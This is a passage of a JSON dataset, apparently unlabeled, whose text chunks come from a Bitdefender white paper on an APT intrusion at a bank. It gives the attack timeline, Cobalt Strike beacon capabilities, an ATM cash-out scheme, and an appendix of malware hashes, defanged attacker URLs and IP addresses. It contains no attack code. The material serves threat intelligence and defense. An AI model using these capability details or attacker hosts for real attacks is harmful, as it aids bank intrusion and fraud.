        "prediction": {}
    },
    {
        "text": "The workstation used to store the .zip archives containing internal banking documents was compromised on Day 9 using domain\nadmin credentials.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "On that day, attackers remotely dialed into the workstation and started accessing various network locations in an\nattempt to find various internal banking application files and documents.\n From Day 10 to Day 27, the same workstation was used to connect to other internal network server.\n ",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "On Day 28 at 10:43:57 and 19:53:49, two .zip archive containing internal documents were created.\n  On Day 30 at 10:53:50, a third .zip archive was created, and it was deleted at 15:34:38.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "On Day 46, attackers deleted a series of documents and folders from the workstation, potentially to cover their tracks and leave no\nevidence regarding the collected documents.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "[11]White Paper\nCobalt Strike Beacon Capabilities\nThe Cobalt Strike beacon is a malicious agent implant that, once dropped on a compromised system, calls back to the attacker and\nchecks for new commands to be executed on the compromised system.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The asynchronous mode keeps commands in a queue and, when the beacon connects\nto a C&C, it downloads commands, executes them, and finally reports results to the C&C server.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This can be particularly useful when\ntrying to keep a low network footprint and not trigger any alarms by constantly \u201cchatting\u201d back and forth with the C&C server.\n While the asynchronous communication mode is also known as \u201clow and slow\u201d, in the sense that it becomes inactive when\nan internet connection is not present, the interactive communication mode offers real-time interaction with the compromised\nworkstation.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Overall framework capabilities include, but are not limited to, executing shell commands, uploading and downloading files, recording\nkeystrokes and taking screenshots, escalating privileges, deploying exploits, bypassing User Account Control (UAC), and even\ndeploying memory scraping tools, such as Mimikatz, or enumerating Active Directory (AD) hosts.\n By supporting malleable communication with the C&C server, it can help attackers blend malicious traffic as legitimate, by allowing\nthem to transform and store data, interpret it backwards, and extract and recover that data from a transaction.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Its purpose remains to manipulate financial assets, such as transferring funds from bank accounts or taking over ATM\ninfrastructures and instructing them to dispense cash at predetermined time intervals.\n  Bitdefender\u2019s investigation shows the attackers\u2019 main methods remain to quietly infiltrate the infrastructure by establishing a\nfoothold on an employee\u2019s system, then move laterally across the infrastructure or elevate privileges to find critical systems that\nmanage financial transactions or ATM networks.\n  This attack falls in line with previous objectives observed in past attacks on other financial institutions, as the cybercriminal\norganization targeted the ATM network to reach systems belonging to key people within the organization who have access to ATM\nsystems.\n ",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "If the attack had succeeded, it would have given hackers control over the ATM network, while money mules would have been\nstanding by the ATM machines at pre-set time intervals to cash them out.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "They could have also been able to reset the cash-out limit\non ATMs, using a predetermined / preauthorized card.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This way, money mules could have extracted the same amount over and over,\nwithout the ATMs reporting any transactions to the bank.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It is not uncommon in a targeted attack for phishing emails to bypass anti-spam solutions deployed at the mail server level, which\nis why it is good practice to deploy an in-depth security model that ensures URL filtering, behavior-based detection techniques and\nsandboxing, aside from classical anti-malware solutions. An enterprise-level solution that looks at both network traffic and endpoint\nbehavior would observe lateral movements by the attacker and flag them for review by a security analyst.\n The damage observed throughout the investigation process was limited to access of internal documents on the compromised\nsystems and user account credentials leaked.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "[13]White Paper\nAppendix A: IOCs\nFile IOCs:\nFilename md5\nsmrs.exe D68351f754a508a386c06946c8e79088\nsmrs.exe 341917d17440ee8a334b202eb0378108\njava.exe d90ecd6c825ce236838112898e1c4a2e\n94563784.doc d117c73e353193118a6383c30e42a95f\nWRF{8F0C5F8E-18A3-48CE-A2F4-2F4DB1B14E94}.tmp b8fc470b9665b33d2071034fdfd6629c\nKbhpQIcahFCuZwq.sct bb784d55895db10b67b1b4f1f5b0be16\nMGsCOxPSNK.txt 4bee6ff39103ffe31118260f9b1c4884\ncqHfjCkTtMwG.doc c2a9443aac258a60d8cace43e839cf9f\ntCrrDqBQoCcEkbnK.txt 581c2a76b382deedb48d1df077e5bdf1\nDLL dropper f0645bd9367faf4e21a9c5e8c132bed7\nDLL dropper 34a58e62866e5c17db61ee5f95d52c58\nDLL dropper 38242fb29d7cb82a4ffd651189d9821e\nDLL dropper f0e52df398b938bf82d9e71ce754ab34\n303F1428C3F.txt eb561d46c6283c632df88bd20ade6df4\n9D01CA.txt bbaee5d936a3809f46fd409b8442f753\nrad353F7.tmp 63c98b8c34ee9261c0068c7f0435a9f9\njusched.exe d68351f754a508a386c06946c8e79088\nnusb1mon.exe ddb9553c6e4e4908b5c7fbbdc4795d6c\nnetscan.exe 1e94f1fdf5ace5e57d8b7832ea2da22e\nnetscan.exe e7aa5608c81ba4fcd8d166501b90fc06\npsexec.exe 27304b246c7d5b4e149124d5f93c5b01\npsexesvc.exe 75b55bb34dac9d02740b9ad6b6820360\npsexec.exe a7f7a0f74c8b48f1699858b3b6c11eda\npsexesvc.exe 87dfac39f577e5f52f0724455e8832a8\nNetwork IOCs:\nswift-fraud[.]com/documents/94563784.doc downloads initial doc\ncloud[.]yourdocument[.]biz/robots.txt downloads DLL dropper\nnl[.][redacted][.]kz/robots.txt downloads JavaScript backdoor\nJavaScript backdoor C&C - gets commands\nnl[.][redacted][.]kz/api/v1\nand executes them\n94.140.116.69\n185.206.145.227\n45.56.162.8\n94.156.35.118\n185.243.115.28\n185.206.146.226\n94.140.116.176\n[14]White Paper\nAppendix B:\nsmrs.exe (d68351f754a508a386c06946c8e79088)\n Downloader that downloads a shellcode, which in turn downloads the beacon.\nsmrs.exe (341917d17440ee8a334b202eb0378108)\nCobalt Strike beacon that\u2019s being deployed on affected workloads.\n jusched.exe (d68351f754a508a386c06946c8e79088)\nDownloader that downloads a shellcode, which in turn downloads the beacon.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Tool that takes screenshots at specific time intervals.\n [15]Bitdefender is a global security technology company that delivers solutions in more than 100 countries through a network of\nvalue-added alliances, distributors and reseller partners. Since 2001, Bitdefender has consistently produced award-winning\nbusiness and consumer security technology, and is a leading security provider in virtualization and cloud technologies. Through\nR&D, alliances and partnership teams, Bitdefender has elevated the highest standards of security excellence in both its number-\none-ranked technology and its strategic alliances with the world\u2019s leading virtualization and cloud technology providers.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Bitdefender is a global cybersecurity leader protecting over 500 million systems in more than 150 countries.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Since 2001, Bitdefender innovation has consistently delivered award-\nwinning security products and threat intelligence for the smart connected home, mobile users, modern businesses and their networks, devices, data centers and Cloud infrastructure.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Today, Bitdefender is also the provider of choice, embedded in over 38% of the world\u2019s security solutions. Recognized by industry, respected by vendors and evangelized by customers,\nBitdefender is the cybersecurity company you can trust and rely on.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    }
]